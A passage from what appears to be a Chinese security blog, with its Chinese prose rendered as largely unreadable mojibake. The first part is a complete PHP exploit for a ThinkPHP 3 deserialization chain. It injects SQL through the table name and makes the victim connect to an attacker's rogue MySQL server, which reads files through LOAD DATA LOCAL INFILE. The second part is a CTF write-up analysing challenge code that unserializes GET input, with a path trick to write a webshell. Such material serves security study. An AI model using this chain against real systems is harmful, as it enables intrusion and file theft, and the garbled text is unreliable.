<p>$optionsæ•°ç»„ä¸ºä¼ å…¥å‚æ•°ï¼Œå¯æ§ï¼Œå…¶ä»–å±æ€§ä¹Ÿå¯æ§ï¼Œè¿™æ ·åœ¨ä¸¤ä¸ªifè¯­å¥ä¸­å‡ºç°çš„å››ä¸ªæ¡ä»¶éƒ½å¯ä»¥æ»¡è¶³ï¼Œå°±å¯ä»¥ç¬¬äºŒæ¬¡è°ƒç”¨delete()æ–¹æ³•ä¹Ÿå°±æ˜¯è‡ªèº«ï¼Œè€Œè¿™æ¬¡çš„å‚æ•°å˜æˆäº†<code>$this-&gt;data[$pk]</code>ï¼Œå®Œå…¨å¯æ§ã€‚è€Œä¸”é€šè¿‡ä¸‹é¢è¿™æ¡è¯­å¥å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„delete()æ–¹æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;db-&gt;delete($options);</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2021/04/04/lYngvwJMqINAerV.png" alt="image-20210404192205171.png"><img src="https://i.loli.net/2021/04/04/amTpCFxkPuoArYO.png" alt="image-20210404193309170.png"></p>
<p><img src="https://i.loli.net/2021/04/04/j2B1oIRhydegsQT.png" alt="image-20210404191751409.png"></p>
<p><strong>4./ThinkPHP/Library/Think/Db/Driver.class.php</strong></p>
<p>$optionsæ•°ç»„ä¸ºä¼ å…¥å‚æ•°ï¼Œå¯æ§ã€‚å› æ­¤$tableå¯æ§ï¼Œ$tableè¢«æ‹¼æ¥åˆ°$sqlï¼Œå†è¢«ä¼ å…¥<code>$this-&gt;execute()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$table&#x3D;$this-&gt;parseTable($options[&#39;table&#39;]);</span><br><span class="line">$sql&#x3D;&#39;DELETE FROM &#39;.$table;</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæ‰§è¡Œ$this-&gt;execute($sql,!empty($options[â€˜fetch_sqlâ€™]) ? true : false);</p>
<p><img src="https://i.loli.net/2021/04/04/lYngvwJMqINAerV.png" alt="image-20210404192205171.png"></p>
<p>execute()æ–¹æ³•ä¸­è°ƒç”¨initConnect()æ–¹æ³•åˆå§‹åŒ–æ•°æ®åº“</p>
<p><img src="https://i.loli.net/2021/04/04/1m6tjDx49d8zcyl.png" alt="image-20210404194434180.png"><img src="https://i.loli.net/2021/04/04/pbGfcN9m3tRh7MS.png" alt="image-20210404194513308.png"></p>
<p>åœ¨initConnect()æ–¹æ³•ä¸­ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å±æ€§ï¼Œæ»¡è¶³æ¡ä»¶empty($this-&gt;config[â€˜deployâ€™])ï¼Œè°ƒç”¨connect()ã€‚</p>
<p><img src="https://i.loli.net/2021/04/04/2dGsbot8HpRjXvc.png" alt="image-20210404194631408.png"></p>
<p>è¿™é‡Œæ–°å»ºäº†ä¸€ä¸ªPDOå¯¹è±¡ï¼Œä½¿ç”¨<code>$this-&gt;config</code>é‡Œçš„é…ç½®å»åˆ›å»ºæ•°æ®åº“è¿æ¥ï¼Œç„¶åå»æ‰§è¡Œå‰é¢æ‹¼æ¥çš„<code>DELETE</code>SQLè¯­å¥ã€‚</p>
<p><img src="https://i.loli.net/2021/04/04/hG8Ol3xDi7JnaPF.png" alt="image-20210404194732354.png"></p>
<h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;thinkphp3&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;192.168.111.129&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>åˆ©ç”¨<code>LOAD DATA INFILE</code>è¯»å–æ–‡ä»¶ï¼Œç”±äºmysqlå®¢æˆ·ç«¯ç»å¯¹ä¿¡ä»»æœåŠ¡ç«¯ã€‚å¯¼è‡´æ”»å‡»æœºå¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„æœåŠ¡ç«¯ï¼Œåœ¨è¿æ¥çš„æ—¶å€™å‘é€è¯»å–æ–‡ä»¶çš„è¯·æ±‚ï¼Œç„¶åè¿”å›çš„ç»“æœä¼šè¢«è®°å½•åˆ°mysql.log</p>
<p>æ­å»ºmysqlæœåŠ¡ç«¯-&gt;å®¢æˆ·ç«¯è¿æ¥-&gt;å‘é€è¯»å–æ–‡ä»¶è¯·æ±‚-&gt;åœ¨mysql.logä¸­è¯»å–æ–‡ä»¶çš„å†…å®¹</p>
<p><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server/">https://github.com/allyshka/Rogue-MySql-Server/</a></p>
<p>ä¿®æ”¹ä¸ºè¦è¯»å–çš„æ–‡ä»¶</p>
<p><img src="https://i.loli.net/2021/04/04/DhMvrdsUTx4OXtK.png" alt="image-20210404184322223.png"></p>
<p>è¿è¡Œ</p>
<p><img src="https://i.loli.net/2021/04/04/Ou1W7lzx9F5hVyQ.png" alt="image-20210404184420116.png"></p>
<p>è§¦å‘ååºåˆ—åŒ–ï¼Œè¿æ¥æ¶æ„æœåŠ¡ç«¯</p>
<p><img src="https://i.loli.net/2021/04/04/DWjhfvqIZEnMcug.png" alt="image-20210404211227400.png"></p>
<p>åœ¨mysql.logä¸­æŸ¥çœ‹è¯»å–åˆ°çš„æ–‡ä»¶</p>
<p><img src="https://i.loli.net/2021/04/04/6ZTkbs1AumcNQJI.png" alt="image-20210404184644477.png"></p>
<p><img src="https://i.loli.net/2021/04/04/ZLzw2tCIXQhpjPm.png" alt="image-20210404184609586.png"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-30T13:31:20.000Z" title="2021-03-30T13:31:20.000Z">2021-03-30</time>å‘è¡¨</span><span class="level-item"><time dateTime="2021-03-30T13:34:34.465Z" title="2021-03-30T13:34:34.465Z">2021-03-30</time>æ›´æ–°</span><span class="level-item">6 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦961ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/30/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%981/">2020 æ–°æ˜¥çº¢åŒ…é¢˜1</a></h1><div class="content"><h1 id="2020-æ–°æ˜¥çº¢åŒ…é¢˜-1"><a href="#2020-æ–°æ˜¥çº¢åŒ…é¢˜-1" class="headerlink" title="[2020 æ–°æ˜¥çº¢åŒ…é¢˜]1"></a>[2020 æ–°æ˜¥çº¢åŒ…é¢˜]1</h1><p>å¯ä»¥çœ‹åˆ°Bç±»ä¸­æœ‰ä¸€ä¸ªå±é™©å‡½æ•°file_put_contentsï¼Œåªè¦èƒ½æ§åˆ¶æ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹å°±å¯ä»¥å†™å…¥webshellã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cachedProperties</span> = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$object</span>)) &#123;</span><br><span class="line">                <span class="variable">$contents</span>[<span class="variable">$path</span>] = array_intersect_key(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cleaned</span> = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([<span class="variable">$cleaned</span>, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params"><span class="variable">$expire</span></span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº</span></span><br><span class="line">        <span class="variable">$cache_filename</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . uniqid() . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$cache_filename</span>, -strlen(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache_filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$serialize</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;getExpireTime(<span class="variable">$expire</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">// åˆ›å»ºå¤±è´¥</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>



<h2 id="æ–‡ä»¶å"><a href="#æ–‡ä»¶å" class="headerlink" title="æ–‡ä»¶å"></a>æ–‡ä»¶å</h2><p>Aç±»çš„keyå±æ€§ä½œä¸ºå‚æ•°ä¼ å…¥setå‡½æ•°</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF0u6J"><img src="https://z3.ax1x.com/2021/03/30/cF0u6J.png" alt="cF0u6J.png"></a></p>
<p>keyå±æ€§ä¼ å…¥setæ–¹æ³•åä½œä¸º$nameä¼ å…¥getCachekeyæ–¹æ³•ï¼Œè¿”å›$filenameåä½œä¸ºfile_put_contentså‡½æ•°çš„æ–‡ä»¶åå‚æ•°</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF0QmR"><img src="https://z3.ax1x.com/2021/03/30/cF0QmR.png" alt="cF0QmR.png"></a></p>
<p>Bç±»çš„getCacheKeyæ–¹æ³•ã€‚æ–‡ä»¶åç”±<code>$this-&gt;options[&#39;prefix&#39;] . uniqid() . $name</code>æ‹¼æ¥è€Œæˆï¼Œuniqid()ä¸ºéšæœºç”Ÿæˆçš„ä¸€ä¸²æ•°å­—ï¼ŒåŒæ—¶å–æœ€åå››ä½çœ‹æ˜¯å¦ç­‰äº.phpã€‚åªè¦åˆ©ç”¨linuxç›®å½•è§£æç‰¹æ€§ä¼ å…¥<code>/../shell.php/.</code>è¿™ç§å½¢å¼å³å¯ç»•è¿‡åç¼€åé™åˆ¶</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF0KX9"><img src="https://z3.ax1x.com/2021/03/30/cF0KX9.png" alt="cF0KX9.png"></a></p>
<h2 id="æ–‡ä»¶å†…å®¹"><a href="#æ–‡ä»¶å†…å®¹" class="headerlink" title="æ–‡ä»¶å†…å®¹"></a>æ–‡ä»¶å†…å®¹</h2><p>1.Aç±»çš„__destruct()æ–¹æ³•è§¦å‘saveæ–¹æ³•</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF08k6"><img src="https://z3.ax1x.com/2021/03/30/cF08k6.png" alt="cF08k6.png"></a></p>
<p>2.Aç±»çš„saveæ–¹æ³•è°ƒç”¨setæ–¹æ³•ï¼Œä»¤storeå±æ€§ç­‰äºBç±»è§¦å‘setï¼Œå†™å…¥çš„æ–‡ä»¶å†…å®¹$contentç­‰äºgetForStorageæ–¹æ³•è¿”å›å€¼,we</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF0l01"><img src="https://z3.ax1x.com/2021/03/30/cF0l01.png" alt="cF0l01.png"></a></p>
<p>3.Aç±»çš„getForStorageæ–¹æ³•ï¼Œ</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF0mpF"><img src="https://z3.ax1x.com/2021/03/30/cF0mpF.png" alt="cF0mpF.png"></a></p>
<p>4.Aç±»çš„cleanContentsæ–¹æ³•ï¼Œæ¥æ”¶ä¸€ä¸ªæ•°ç»„ä¸ºå‚æ•°ï¼Œarray_intersect_keyå–ä¸¤ä¸ªæ•°ç»„çš„å­é›†ï¼ŒæŠŠå®ƒä»¬çš„é”®å€¼äº¤æ¢åè¿”å›ï¼Œè¿™é‡Œå°±è¦æ±‚cacheå¿…é¡»ä¸ºä¸€ä¸ªæ•°ç»„</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cF0nl4"><img src="https://z3.ax1x.com/2021/03/30/cF0nl4.png" alt="cF0nl4.png"></a></p>
